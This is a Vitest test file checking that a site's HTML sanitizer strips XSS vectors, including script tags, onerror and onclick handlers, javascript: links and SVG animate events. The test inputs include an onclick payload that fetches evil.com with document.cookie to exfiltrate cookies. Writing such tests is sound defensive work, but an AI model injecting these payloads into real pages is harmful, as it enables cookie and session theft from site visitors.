import { describe, it, expect } from 'vitest';
import { sanitizeRichHtml, sanitizeHeadMarkup } from '../lib/sanitize';

describe('HTML Sanitizer Security Tests (Block A8 - Anti-XSS)', () => {
  it('should remove inline <script> tags and executable JavaScript', () => {
    const malicious = '<p>Hello <script>alert("XSS")</script> World</p>';
    const clean = sanitizeRichHtml(malicious);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert("XSS")');
    expect(clean).toBe('<p>Hello  World</p>');
  });

  it('should remove onerror and onload event handlers from images', () => {
    const malicious = '<img src="x" onerror="alert(document.cookie)" alt="Test" />';
    const clean = sanitizeRichHtml(malicious);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('alert');
  });

  it('should remove onclick and onmouseover handlers from links and divs', () => {
    const malicious = '<a href="https://collectibles.uy" onclick="fetch(\'https://evil.com?c=\'+document.cookie)">Click</a>';
    const clean = sanitizeRichHtml(malicious);
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('evil.com');
  });

  it('should remove javascript: pseudo-protocol in href and src', () => {
    const malicious = '<a href="javascript:alert(1)">Exploit Link</a>';
    const clean = sanitizeRichHtml(malicious);
    expect(clean).not.toContain('javascript:');
  });

  it('should strip nested or malformed SVG / MathML attack vectors', () => {
    const malicious = '<svg><animate onbegin=alert(1) attributeName=x></animate></svg>';
    const clean = sanitizeRichHtml(malicious);
    expect(clean).not.toContain('onbegin');
    expect(clean).not.toContain('animate');
  });

  it('should preserve safe formatting and valid links', () => {
    const safe = '<div class="content"><p>Bienvenido a <strong>Collectibles</strong>. Visita nuestro <a href="https://collectibles.uy/shop">catálogo</a>.</p></div>';
    const clean = sanitizeRichHtml(safe);
    expect(clean).toContain('<strong>Collectibles</strong>');
    expect(clean).toContain('href="https://collectibles.uy/shop"');
  });

  it('should allow application/ld+json scripts in sanitizeHeadMarkup but strip regular scripts', () => {
    const safeLdJson = '<script type="application/ld+json">{"@context":"https://schema.org","@type":"Store"}</script>';
    const maliciousScript = '<script type="text/javascript">alert(1)</script>';
    
    const cleanLdJson = sanitizeHeadMarkup(safeLdJson);
    expect(cleanLdJson).toContain('application/ld+json');

    const cleanMalicious = sanitizeHeadMarkup(maliciousScript);
    expect(cleanMalicious).not.toContain('alert(1)');
    expect(cleanMalicious).not.toContain('text/javascript');
  });
});
